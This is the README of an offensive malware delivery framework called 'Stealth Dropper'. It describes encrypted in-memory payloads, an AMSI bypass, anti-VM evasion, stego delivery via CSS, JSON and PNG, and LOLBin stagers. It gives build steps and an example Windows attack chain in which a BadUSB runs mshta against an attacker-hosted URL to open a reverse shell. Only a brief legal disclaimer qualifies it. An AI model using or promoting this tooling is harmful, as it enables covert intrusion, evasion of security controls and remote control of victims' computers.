# Stealth Dropper (2025 Edition)

**Multi-stage, multi-OS, in-memory malware delivery framework**

## ✅ Features
- AES-256 encrypted payload delivery
- Full in-memory execution (no file drops)
- Multi-OS support: Windows / Linux / macOS
- Web-based stagers via mshta / rundll32 / regsvr32
- Payload delivery via CSS, JSON, PNG (LSB stego)
- Anti-VM / sandbox detection module
- DuckyScript generation for WiFi BadUSB

---

## 📁 Project Structure
```
stealth-dropper/
├── run.sh                  # main automation script
├── config/                 # config/settings.json
├── core/                   # anti_vm.ps1
├── output/                 # generated stagers + logs
├── payloads/               # raw stage 2 payloads by OS
├── stagers/                # template stage 1 payloads for delivery
├── tools/                  # encryption & embedding tools
└── web/                    # hosted delivery files
```

---



## 🚀 How to Use

### 0. [RECOMMENDED] Setup Python virtual environment

Before running, it is **highly recommended** to use a Python virtual environment to isolate dependencies:

```bash
# 1. Clone the repository
git clone https://github.com/trxtr337/stealth-dropper-EXTENDED.git
cd stealth-dropper-EXTENDED

# 2. Create a virtual environment
python3 -m venv venv

# 3. Activate the environment:
# For Linux/macOS:
source venv/bin/activate
# For Windows:
venv\\Scripts\\activate

# 4. Install required dependencies
pip install -r requirements.txt

### 1. Set encryption key in `.env`

```
ENCRYPTION_KEY=Zxcvbnm1234567890Zxcvbnm12345678
```

### 2. Run the builder
```bash
chmod +x run.sh
./run.sh
```

You'll be prompted to select:
- IP and PORTS
- Target OS
- Payload type (e.g. shell_reverse)
- Delivery method (css / manifest / png)

Result:
- Stage 2 is AES-encrypted
- Stage 1 (PowerShell / HTA / SCT) is generated
- Payload is embedded in CSS/JSON/PNG
- Server starts at `http://<your-ip>:<port>`
- DuckyScript saved in `output/ducky_payload.txt`

---

## 🧪 Example Attack Chain (Windows)
```
1. Deliver WiFi Ducky:
   > GUI r
   > mshta http://<your-ip>:8000/decrypt.html

2. HTML decrypts AES payload from CSS/JSON/PNG
3. Executes PowerShell stage 2 in memory
4. Reverse shell connects back to you
```

---

## 📦 Supported Payloads
- `windows/shell_reverse` → raw.ps1 TCP shell
- `windows/lolbins/js_payload.html` → mshta/jscript shell
- `linux/bash_reverse` → raw.sh reverse TCP
- `mac/osascript` → raw.osascript reverse shell

---

## 🔐 Stealth Considerations
- No IEX / no downloadstring / no Invoke-Obfuscation
- AMSI bypass injected in stage 1
- Anti-VM checks built-in (RAM, hostname, vendor)
- No file drops unless explicitly instructed

---

## 🛠 Requirements
- Python 3.8+
- pip install -r requirements.txt
- Dependencies: `python-dotenv`, `pycryptodome`, `Pillow`

---

## ⚠️ Legal Notice
> This project is for educational and authorized testing use only.  
> You are responsible for your actions. Do not deploy without explicit permission.
